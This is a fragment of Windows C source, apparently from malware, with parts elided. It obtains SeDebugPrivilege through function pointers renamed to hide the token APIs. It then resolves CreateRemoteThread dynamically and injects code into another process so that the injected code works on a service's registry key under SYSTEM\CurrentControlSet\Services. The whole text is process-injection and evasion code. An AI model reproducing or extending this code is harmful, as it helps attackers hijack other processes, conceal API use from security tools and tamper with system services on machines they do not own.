...
bool EnableDebugPriv(void)
{
	...
	if (!myopt(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return false;
	
	 
	
	if (!mylpv(NULL,SE_DEBUG_NAME,&sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	...
	if(!myapt(hToken,FALSE,&tkp,sizeof(tkp),NULL,NULL))
	{
		CloseHandle(hToken);
		return false;
	}
...
bool InjectRemoveService(LPCTSTR lpProcessName, LPTSTR lpServiceName)
{
	EnableDebugPriv();
	HANDLE hProcess;
	...
	lstrcpy(remoteParameter.strServiceRegKey, _T("SYSTEM\\CurrentControlSet\\Services\\"));
...
; 
	typedef BOOL (WINAPI *NETCRT)(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId); 
	HINSTANCE  hdllb1 = LoadLibrary(_T("KERNEL32.dll")); 
	NETCRT myNetCrt= (NETCRT  )GetProcAddress(hdllb1,"CreateRemoteThread"); 
	if (myNetCrt(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pCodeRemote, pDataRemote, 0, NULL) == NULL) 
		FreeLibrary(hdllb1);
